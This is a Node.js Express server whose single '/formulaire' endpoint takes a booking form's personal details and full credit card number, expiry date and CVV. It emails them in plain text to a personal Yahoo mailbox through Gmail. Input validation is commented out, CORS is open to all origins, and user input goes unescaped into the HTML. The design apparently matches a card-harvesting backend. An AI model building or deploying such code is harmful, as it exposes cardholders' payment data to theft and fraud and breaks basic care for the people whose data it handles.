const express = require("express");
const bodyParser = require("body-parser");
const app = express();
var cors = require("cors");
const dotenv = require("dotenv");
dotenv.config();

const port = process.env.PORT || 5000;
app.set("port", port);

app.use(express.json());
app.use(bodyParser.json());
app.use(cors());
app.options("*", cors());

app.post("/formulaire", async (req, res) => {
  console.log("begining");
  /*const { email, password } = req.body;
  if (!email || !password) {
    return res.status(401).json({ error: "update failed" });
  }*/
  try {
    var nodemailer = require("nodemailer");

    var transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "farisbrandone0@gmail.com",
        pass: process.env.APP_PASSWORD,
      },
    });
    /*result = {
      sexe: selectedSexe,
      nom: selectedName,
      prenom: selectedPrenom,
      rue_et_numero: selectedRueEtNumero,
      adresse_complementaire: selectedComAdresse,
      code_postal: selectedCodePostal,
      lieux: selectedLieux,
      pays: selectedPays,
      telephone: selectedTel,
      email: selectedEmail,
      date_de_darrive: selectedDays.daysStart,
      deta_de_depart: selectedDays.daysEnd,
      nom_sur_carte_de_credit: selectedCardName,
      numero_sur_carte_de_credit: selectedCardNumber,
      mois_dexpiration_de_la_carte: selectedMonthExp,
      année_dexpiration_de_la_carte: selectedYearsExp,
      numero_cvv_de_la_carte: selectedCvv,
    };*/
    var mailoutput = `<html>
    <body>
    <table>
    <tr>
    <td>Sexe: </td>
     
      <td> ${req.body.sexe} </td>
    </tr>
    <tr>
    <td>Nom: </td><td>
      ${req.body.nom} 
      </td>
    </tr>
    <tr>
    <td>Prenom: </td>
    
      <td> ${req.body.prenom}</td>
    </tr>
    <tr>
    <td>Rue et numero: </td>
     
      <td> ${req.body.rue_et_numero} </td>
    </tr>
    <tr>
    <td>Adresse_complementaire: </td>
     
      <td> ${req.body.adresse_complementaire}</td>
    </tr>
    <tr>
    <td>Code postal: </td>
       
      <td>${req.body.code_postal}</td>
    </tr>
    <tr>
    <td> Lieux: </td>
     
      <td> ${req.body.lieux} </td>
    </tr>
    <tr>
    <td>Pays: </td>
     
      <td> ${req.body.pays} </td>
    </tr>
    <tr>
    <td>Telephone: </td>
       
      <td>${req.body.telephone}</td>
    </tr>
    <tr>
    <td>Email: </td>
      
      <td>${req.body.email}</td>
    </tr>
    <tr>
    <td>Date de darrive: </td>
     
      <td> ${req.body.date_de_darrive} </td>
    </tr>
    <tr>
    <td>Date de depart: </td>
      
      <td>${req.body.deta_de_depart}</td>
    </tr>
    <tr>
    <td>Nom sur carte de credit: </td>
     
      <td> ${req.body.nom_sur_carte_de_credit} </td>
    </tr>
    <tr>
    <td>Numero sur carte de credit: </td>
     
      <td> ${req.body.numero_sur_carte_de_credit}</td>
    </tr>
    <tr>
    <td>Mois d'expiration de la carte: </td>
     
      <td> ${req.body.mois_dexpiration_de_la_carte}</td>
    </tr>
    <tr>
    <td>Année d'expiration de la carte: </td>
     
      <td>${req.body.année_dexpiration_de_la_carte}</td>
    </tr>
    <tr>
    <td>Numero cvv de la carte: </td> 
      
      <td>${req.body.numero_cvv_de_la_carte}</td>
    </tr>
    </table></body></html>`;

    var mailOptions = {
      from: "farisbrandone0@gmail.com",
      to: "farisbrandone@yahoo.com",
      subject: "Sending Email using Node.js",
      html: mailoutput,
    };

    transporter.sendMail(mailOptions, function (error, info) {
      if (error) {
        res.status(500).json({ error: "send email failed" });
      } else {
        console.log("Email sent: " + info.response);
        res.status(200).json({ final: true });
      }
    });
  } catch (error) {
    res.status(500).json({ error: "send email failed" });
  }
});

app.listen(app.get("port"), function () {
  console.log(
    "Express started on http://localhost:" +
      app.get("port") +
      "; press Ctrl-C to terminate."
  );
});
